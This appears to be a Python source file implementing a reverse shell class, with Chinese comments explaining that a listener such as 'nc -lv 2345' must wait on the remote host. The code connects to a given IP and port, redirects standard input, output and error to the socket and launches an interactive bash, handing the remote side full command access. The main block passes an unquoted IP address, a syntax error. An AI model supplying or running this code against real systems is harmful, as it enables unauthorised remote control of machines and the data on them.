#coding:utf-8
#

import os
import subprocess
import socket

class ReverseShell(object):
    """
    反弹shell
    """
    
    def __init__(self, ip, port=2345):
        """
        反弹shell给的ip/端口，远端需要先监听该端口
        如: nc -lv 2345
        """
        self.ip = ip
        self.port = port
    
    def start(self):
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #Save previous standard std and descriptors
        prevOutFd = os.dup(1)
        prevInFd = os.dup(0)
        prevErrFd = os.dup(2)
        #Open socket
        sock.connect((self.ip,self.port))
        #Redirect standard in, out, and error
        os.dup2(sock.fileno(),0)
        os.dup2(sock.fileno(),1)
        os.dup2(sock.fileno(),2)
        #Pass the shell
        subprocess.call(["/bin/bash","-i"])
        #Kill the socket
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
        #Restore standard in, out, and error
        os.dup2(prevOutFd, 1)
        os.close(prevOutFd)
        os.dup2(prevInFd, 0)
        os.close(prevInFd)
        os.dup2(prevErrFd,2)
        os.close(prevErrFd)



if __name__=="__main__":
    
    r=ReverseShell(192.168.253.128,2345)
    r.start()


